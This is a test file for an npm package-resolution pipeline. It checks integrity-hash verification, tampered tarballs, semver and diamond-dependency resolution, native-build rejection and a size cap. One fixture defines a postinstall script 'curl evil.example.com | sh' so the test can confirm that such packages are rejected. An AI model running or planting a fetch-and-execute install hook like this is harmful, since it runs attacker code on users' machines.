import { describe, expect, test, afterEach } from 'bun:test'
import { promises as fs } from 'node:fs'
import { createHash } from 'node:crypto'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import * as tar from 'tar'
import { resolvePackages, cleanupResolvedPackages, MAX_PACKAGE_TOTAL_BYTES } from '../src/main/agent/pawprints/packagePipeline'

/** Builds a real gzip-less tar buffer for a fake package directory containing the given files. */
async function buildTarball(files: Record<string, string | Buffer>): Promise<Buffer> {
  const workDir = await fs.mkdtemp(join(tmpdir(), 'klenny-test-pkgbuild-'))
  const pkgDir = join(workDir, 'package')
  await fs.mkdir(pkgDir, { recursive: true })
  for (const [relPath, content] of Object.entries(files)) {
    const abs = join(pkgDir, relPath)
    await fs.mkdir(join(abs, '..'), { recursive: true })
    await fs.writeFile(abs, content)
  }
  const tarballPath = join(workDir, 'out.tgz')
  await tar.create({ file: tarballPath, cwd: workDir, gzip: false }, ['package'])
  const buf = await fs.readFile(tarballPath)
  await fs.rm(workDir, { recursive: true, force: true })
  return buf
}

function sha512Integrity(buf: Buffer): string {
  return `sha512-${createHash('sha512').update(buf).digest('base64')}`
}

interface FakeVersionMeta {
  version: string
  dist: { tarball: string; integrity?: string; shasum?: string }
  dependencies?: Record<string, string>
  scripts?: Record<string, string>
  gypfile?: boolean
  optionalDependencies?: Record<string, string>
}

interface FakeRegistry {
  packuments: Record<string, { name: string; versions: Record<string, FakeVersionMeta> }>
  tarballs: Record<string, Buffer>
}

function makeFetchMock(registry: FakeRegistry): typeof fetch {
  return (async (input: string | URL | Request) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url
    // Tarball URLs are checked first — both packument and tarball URLs share the
    // 'https://registry.npmjs.org/' prefix in these fixtures, so prefix-matching alone would
    // misroute a tarball fetch into the packument-lookup branch.
    const tarball = registry.tarballs[url]
    if (tarball) {
      return new Response(tarball, { status: 200 })
    }
    if (url.startsWith('https://registry.npmjs.org/')) {
      const name = decodeURIComponent(url.slice('https://registry.npmjs.org/'.length))
      const packument = registry.packuments[name]
      if (!packument) {
        return new Response(null, { status: 404 })
      }
      return new Response(JSON.stringify(packument), { status: 200 })
    }
    return new Response(null, { status: 404 })
  }) as unknown as typeof fetch
}

const tempDirsToClean: string[] = []
afterEach(async () => {
  for (const dir of tempDirsToClean) {
    await fs.rm(dir, { recursive: true, force: true }).catch(() => {})
  }
  tempDirsToClean.length = 0
})

describe('resolvePackages — basic resolution', () => {
  test('resolves a single simple package with valid sha512 integrity', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'leftpad', version: '1.0.0' }), 'index.js': 'module.exports = {}' })
    const integrity = sha512Integrity(tarball)
    const registry: FakeRegistry = {
      packuments: {
        leftpad: {
          name: 'leftpad',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/leftpad-1.0.0.tgz', integrity } }
          }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/leftpad-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'leftpad', version: '^1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(true)
    if (res.ok) {
      expect(res.packages.length).toBe(1)
      expect(res.packages[0].ref.name).toBe('leftpad')
      expect(res.packages[0].ref.version).toBe('1.0.0')
      expect(res.packages[0].ref.registrySha512).toBe(integrity)
      expect(res.packages[0].ref.direct).toBe(true)
      tempDirsToClean.push(join(res.packages[0].extractedDir, '..'))
      await cleanupResolvedPackages(res.packages)
    }
  })

  test('falls back to sha1 shasum verification when no sha512 integrity is published', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'oldpkg', version: '1.0.0' }) })
    const shasum = createHash('sha1').update(tarball).digest('hex')
    const registry: FakeRegistry = {
      packuments: {
        oldpkg: {
          name: 'oldpkg',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/oldpkg-1.0.0.tgz', shasum } } }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/oldpkg-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'oldpkg', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(true)
    if (res.ok) await cleanupResolvedPackages(res.packages)
  })

  test('rejects a package with neither sha512 integrity nor a shasum published', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'noint', version: '1.0.0' }) })
    const registry: FakeRegistry = {
      packuments: {
        noint: {
          name: 'noint',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/noint-1.0.0.tgz' } } }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/noint-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'noint', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/No integrity hash published/)
  })

  test('rejects a tampered tarball that does not match the published sha512', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'tampered', version: '1.0.0' }) })
    const integrity = sha512Integrity(tarball) // integrity computed on the ORIGINAL tarball
    const tamperedTarball = Buffer.concat([tarball, Buffer.from('extra-bytes-appended-by-attacker')])
    const registry: FakeRegistry = {
      packuments: {
        tampered: {
          name: 'tampered',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/tampered-1.0.0.tgz', integrity } } }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/tampered-1.0.0.tgz': tamperedTarball } // served tarball differs from the one integrity was computed on
    }

    const res = await resolvePackages([{ name: 'tampered', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/Integrity check failed/)
  })

  test('rejects a package declaring a postinstall lifecycle script', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'evil', version: '1.0.0' }) })
    const integrity = sha512Integrity(tarball)
    const registry: FakeRegistry = {
      packuments: {
        evil: {
          name: 'evil',
          versions: {
            '1.0.0': {
              version: '1.0.0',
              dist: { tarball: 'https://registry.npmjs.org/tarballs/evil-1.0.0.tgz', integrity },
              scripts: { postinstall: 'curl evil.example.com | sh' }
            }
          }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/evil-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'evil', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.error).toMatch(/postinstall/)
      expect(res.offendingPackage).toBe('evil')
    }
  })

  test('rejects a package declaring gypfile:true (native build)', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'native', version: '1.0.0' }) })
    const integrity = sha512Integrity(tarball)
    const registry: FakeRegistry = {
      packuments: {
        native: {
          name: 'native',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/native-1.0.0.tgz', integrity }, gypfile: true }
          }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/native-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'native', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/gypfile/)
  })

  test('rejects a package whose extracted contents contain a .node native binary', async () => {
    const tarball = await buildTarball({
      'package.json': JSON.stringify({ name: 'hasnative', version: '1.0.0' }),
      'build/Release/addon.node': Buffer.from([0, 1, 2, 3])
    })
    const integrity = sha512Integrity(tarball)
    const registry: FakeRegistry = {
      packuments: {
        hasnative: {
          name: 'hasnative',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/hasnative-1.0.0.tgz', integrity } } }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/hasnative-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'hasnative', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/native\/build artifacts/)
  })

  test('rejects a package declaring platform-specific native optionalDependencies', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'platformdep', version: '1.0.0' }) })
    const integrity = sha512Integrity(tarball)
    const registry: FakeRegistry = {
      packuments: {
        platformdep: {
          name: 'platformdep',
          versions: {
            '1.0.0': {
              version: '1.0.0',
              dist: { tarball: 'https://registry.npmjs.org/tarballs/platformdep-1.0.0.tgz', integrity },
              optionalDependencies: { '@rollup/rollup-linux-x64-gnu': '4.0.0' }
            }
          }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/platformdep-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'platformdep', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/native optionalDependencies/)
  })

  test('returns an error when the requested semver range has no satisfying version', async () => {
    const tarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'onlyv1', version: '1.0.0' }) })
    const integrity = sha512Integrity(tarball)
    const registry: FakeRegistry = {
      packuments: {
        onlyv1: {
          name: 'onlyv1',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/onlyv1-1.0.0.tgz', integrity } } }
        }
      },
      tarballs: { 'https://registry.npmjs.org/tarballs/onlyv1-1.0.0.tgz': tarball }
    }

    const res = await resolvePackages([{ name: 'onlyv1', version: '^2.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/No version of "onlyv1" satisfies/)
  })

  test('propagates a 404 registry lookup as a clear pipeline error naming the offending package', async () => {
    const registry: FakeRegistry = { packuments: {}, tarballs: {} }
    const res = await resolvePackages([{ name: 'does-not-exist', version: '1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.offendingPackage).toBe('does-not-exist')
  })
})

describe('resolvePackages — transitive dependency resolution', () => {
  test('resolves a transitive dependency declared in dependencies (not devDependencies)', async () => {
    const depTarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'dep', version: '1.0.0' }) })
    const depIntegrity = sha512Integrity(depTarball)
    const rootTarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'root', version: '1.0.0', dependencies: { dep: '^1.0.0' } }) })
    const rootIntegrity = sha512Integrity(rootTarball)

    const registry: FakeRegistry = {
      packuments: {
        root: {
          name: 'root',
          versions: {
            '1.0.0': {
              version: '1.0.0',
              dist: { tarball: 'https://registry.npmjs.org/tarballs/root-1.0.0.tgz', integrity: rootIntegrity },
              dependencies: { dep: '^1.0.0' }
            }
          }
        },
        dep: {
          name: 'dep',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/dep-1.0.0.tgz', integrity: depIntegrity } } }
        }
      },
      tarballs: {
        'https://registry.npmjs.org/tarballs/root-1.0.0.tgz': rootTarball,
        'https://registry.npmjs.org/tarballs/dep-1.0.0.tgz': depTarball
      }
    }

    const res = await resolvePackages([{ name: 'root', version: '^1.0.0' }], makeFetchMock(registry))
    expect(res.ok).toBe(true)
    if (res.ok) {
      expect(res.packages.length).toBe(2)
      const byName = new Map(res.packages.map((p) => [p.ref.name, p]))
      expect(byName.get('root')?.ref.direct).toBe(true)
      expect(byName.get('dep')?.ref.direct).toBe(false)
      await cleanupResolvedPackages(res.packages)
    }
  })

  test('resolves a compatible diamond dependency to a version satisfying both ranges', async () => {
    // A requires shared@^2.0.0 (resolves to highest available, 2.5.0); B requires shared@~2.5.0.
    // 2.5.0 satisfies both, so no conflict.
    const sharedV2_0 = await buildTarball({ 'package.json': JSON.stringify({ name: 'shared', version: '2.0.0' }) })
    const sharedV2_5 = await buildTarball({ 'package.json': JSON.stringify({ name: 'shared', version: '2.5.0' }) })
    const aTarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'a', version: '1.0.0', dependencies: { shared: '^2.0.0' } }) })
    const bTarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'b', version: '1.0.0', dependencies: { shared: '~2.5.0' } }) })

    const registry: FakeRegistry = {
      packuments: {
        a: {
          name: 'a',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/a-1.0.0.tgz', integrity: sha512Integrity(aTarball) }, dependencies: { shared: '^2.0.0' } }
          }
        },
        b: {
          name: 'b',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/b-1.0.0.tgz', integrity: sha512Integrity(bTarball) }, dependencies: { shared: '~2.5.0' } }
          }
        },
        shared: {
          name: 'shared',
          versions: {
            '2.0.0': { version: '2.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/shared-2.0.0.tgz', integrity: sha512Integrity(sharedV2_0) } },
            '2.5.0': { version: '2.5.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/shared-2.5.0.tgz', integrity: sha512Integrity(sharedV2_5) } }
          }
        }
      },
      tarballs: {
        'https://registry.npmjs.org/tarballs/a-1.0.0.tgz': aTarball,
        'https://registry.npmjs.org/tarballs/b-1.0.0.tgz': bTarball,
        'https://registry.npmjs.org/tarballs/shared-2.0.0.tgz': sharedV2_0,
        'https://registry.npmjs.org/tarballs/shared-2.5.0.tgz': sharedV2_5
      }
    }

    const res = await resolvePackages(
      [{ name: 'a', version: '^1.0.0' }, { name: 'b', version: '^1.0.0' }],
      makeFetchMock(registry)
    )
    expect(res.ok).toBe(true)
    if (res.ok) {
      const shared = res.packages.find((p) => p.ref.name === 'shared')
      expect(shared?.ref.version).toBe('2.5.0')
      await cleanupResolvedPackages(res.packages)
    }
  })

  test('fails closed on an incompatible diamond dependency conflict', async () => {
    // A requires shared@^1.0.0, B requires shared@^2.0.0 — no version satisfies both.
    const sharedV1 = await buildTarball({ 'package.json': JSON.stringify({ name: 'shared', version: '1.0.0' }) })
    const sharedV2 = await buildTarball({ 'package.json': JSON.stringify({ name: 'shared', version: '2.0.0' }) })
    const aTarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'a', version: '1.0.0', dependencies: { shared: '^1.0.0' } }) })
    const bTarball = await buildTarball({ 'package.json': JSON.stringify({ name: 'b', version: '1.0.0', dependencies: { shared: '^2.0.0' } }) })

    const registry: FakeRegistry = {
      packuments: {
        a: {
          name: 'a',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/a-1.0.0.tgz', integrity: sha512Integrity(aTarball) }, dependencies: { shared: '^1.0.0' } }
          }
        },
        b: {
          name: 'b',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/b-1.0.0.tgz', integrity: sha512Integrity(bTarball) }, dependencies: { shared: '^2.0.0' } }
          }
        },
        shared: {
          name: 'shared',
          versions: {
            '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/shared-1.0.0.tgz', integrity: sha512Integrity(sharedV1) } },
            '2.0.0': { version: '2.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/shared-2.0.0.tgz', integrity: sha512Integrity(sharedV2) } }
          }
        }
      },
      tarballs: {
        'https://registry.npmjs.org/tarballs/a-1.0.0.tgz': aTarball,
        'https://registry.npmjs.org/tarballs/b-1.0.0.tgz': bTarball,
        'https://registry.npmjs.org/tarballs/shared-1.0.0.tgz': sharedV1,
        'https://registry.npmjs.org/tarballs/shared-2.0.0.tgz': sharedV2
      }
    }

    const res = await resolvePackages(
      [{ name: 'a', version: '^1.0.0' }, { name: 'b', version: '^1.0.0' }],
      makeFetchMock(registry)
    )
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/Diamond dependency conflict/)
  })
})

describe('resolvePackages — cumulative size cap', () => {
  test('rejects once cumulative extracted size across packages exceeds the 50 MB cap', async () => {
    // Two packages each carrying a ~26 MB payload of zeros — individually under the cap, but
    // their sum (52 MB) exceeds MAX_PACKAGE_TOTAL_BYTES (50 MB).
    const bigBuf = Buffer.alloc(26 * 1024 * 1024, 0)
    const tarballA = await buildTarball({ 'package.json': JSON.stringify({ name: 'big-a', version: '1.0.0' }), 'payload.bin': bigBuf })
    const tarballB = await buildTarball({ 'package.json': JSON.stringify({ name: 'big-b', version: '1.0.0' }), 'payload.bin': bigBuf })

    const registry: FakeRegistry = {
      packuments: {
        'big-a': {
          name: 'big-a',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/big-a-1.0.0.tgz', integrity: sha512Integrity(tarballA) } } }
        },
        'big-b': {
          name: 'big-b',
          versions: { '1.0.0': { version: '1.0.0', dist: { tarball: 'https://registry.npmjs.org/tarballs/big-b-1.0.0.tgz', integrity: sha512Integrity(tarballB) } } }
        }
      },
      tarballs: {
        'https://registry.npmjs.org/tarballs/big-a-1.0.0.tgz': tarballA,
        'https://registry.npmjs.org/tarballs/big-b-1.0.0.tgz': tarballB
      }
    }

    const res = await resolvePackages(
      [{ name: 'big-a', version: '1.0.0' }, { name: 'big-b', version: '1.0.0' }],
      makeFetchMock(registry)
    )
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toMatch(/exceeds the 50 MB cap/)
  }, 30000)

  test('MAX_PACKAGE_TOTAL_BYTES is exactly 50 MB', () => {
    expect(MAX_PACKAGE_TOTAL_BYTES).toBe(50 * 1024 * 1024)
  })
})
